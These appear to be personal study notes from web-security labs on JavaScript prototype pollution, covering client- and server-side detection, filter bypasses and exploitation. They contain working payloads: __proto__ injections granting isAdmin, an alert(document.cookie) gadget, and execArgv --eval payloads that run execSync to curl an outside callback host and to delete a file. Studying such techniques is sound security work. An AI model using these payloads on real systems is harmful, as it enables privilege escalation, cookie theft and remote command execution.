
prototype pollution is a js vuln that enable an attacker to add propertes to global object prototype which  can be inherited by user defined objects

this usually exploited when the app handles an attacker controlled property in an unsafe way


Look for 
- [ ] prototype source input that enable you to poison prototype
- [ ] a sink for js or DOM 
- [ ] exploitable gadget


### JS prototype and inheritance

js object is essentially just a collection of key:value  known as properties

const user = {username="ei" ...}

we can access the properties of an object by using dotnotion or bracket

user.username , user['userId']

- as well as example : function()


### what are prototypes

- they are basically objects that are linked  to another objects  strings are automatically assigned a build in String.prototype
	``let myObject = {}; Object.getPrototypeOf(myObject);``

this for example objects automatically inheret all of the properties of their assigned prototype. hence it enables developers to create new object  that can reuse the properties and methods of existing objects  for example toLowerCase() method 

simple exmaple is let myObject= {}; even if its an empty object we can set a protoype to it like Object.prototype

-  top levvel object prototype  is null



### accessing an object prototype __proto

we can use __proto__ to read the prototye and its properties  and it cna be a chain .proto.proto



-  whats that vuln basically its when  a js function recursively merges an object containing  user controllable properties into existing object without sanitizing the key , the merge operation that may assign the nested properties to the object prototype instead of the object itself.
- it spossible to pollute any prototype object in the chain



# Labs

### Polluting via URL

``https://vulnerable-website.com/?__proto__[evilProperty]=payload``


``{ existingProperty1: 'foo', existingProperty2: 'bar', __proto__: { evilProperty: 'payload' } }``


at some point the recursive operation may assign the value of evilProperty using this statement

``targetObject.__proto__.evilProperty = 'payload';``


```In practice, injecting a property called evilProperty is unlikely to have any effect. However, an attacker can use the same technique to pollute the prototype with properties that are used by the application, or any imported libraries.```

### pollution via JSON input

```json 
`{ "__proto__": { "evilProperty": "payload" } }`
```

json-parse()  treats any key in the json object as arbitrary string like proto its c

``const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');``


### Prototype pollution sinks

js function or DOM element that are able to access proto polution which inable us to execute js or system commands 


- prototype gadget means that when we turn a prototype pollutionn vuln into an actual exploit 
- example of gadget  in he library code check whether the dev has added certain protperites to the object if a propery represents a particular option  that is not present 




# Server Side:
attention required in the client side when polluing we can always refresh the page and we are clear in the server side we cant do something like that 

always attempt to pollute global protoype  in POST or PUT 
```{ "user":"wiener", "firstName":"Peter", "lastName":"Wiener", "__proto__":{ "foo":"bar" }```


- [ ] check first if we can pollute ``"__proto__": { "json spaces":10 }``
- [ ] send to server side pollution extension 
### Detecting server-side prototype pollution

try  injecting properties that match potential configuration  and then compare the severs behaviour before and after  try something simple like `- [Status code override](https://portswigger.net/web-security/prototype-pollution/server-side#status-code-override)
- JSON spaces override, Charset override,charset-override`




### Privilege escalation via server-side prototype pollution
`POST /my-account/change-address `
```
"country":"UK","sessionId":"WWpOOK65WHVhdK7kOW3nAdPtRwfeDLGN",
  "__proto__":{
        "isAdmin":"True"
    }
```
    
### Client-side prototype pollution in third-party libraries

`<script> location="https://lab.net/#__proto__[hitCallback]=alert%28document.cookie%29" </script>`

### Bypassing flawed key sanitization

`?__pro__proto__to__[transport_url]=data%3A%2Calert%281%29`


### Client-side prototype pollution in third-party libraries

`chat#__proto__[hitCallback]=alert%281%29`

not solved but triggered

### Detecting server-side prototype pollution without polluted property reflection
idea is that data is not reflected so its blind hence trigger some status error and check its behaviour like this when it works  should return a status 555 rather thatn 400

`"__proto__": {"status":555}`



### Bypassing flawed input filters for server-side prototype pollution


sometime the server santize the keyword of __proto__ we can bypass this by usingn the constructor method

`"constructor":{"prototype":{"isAdmin": true}}`


### Remote code execution via server-side prototype pollution

call the collab first

create a child process then execute a command  `--eval` argument, which enables you to pass in arbitrary JavaScript that will be executed by the child process
in the change address then when executing the admin  run maintenance job it works 

``"__proto__": {"execArgv":["--eval=require('child_process').execSync('curl https://ke28n8t7cxh5nrjkmo48g1gjqaw1kv8k.oastify.com')"]}``

we can execute any command 

``"__proto__": { "execArgv":[ "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')" ] }``


# Useful Links

https://www.netspi.com/blog/technical-blog/web-application-pentesting/ultimate-guide-to-prototype-pollution/
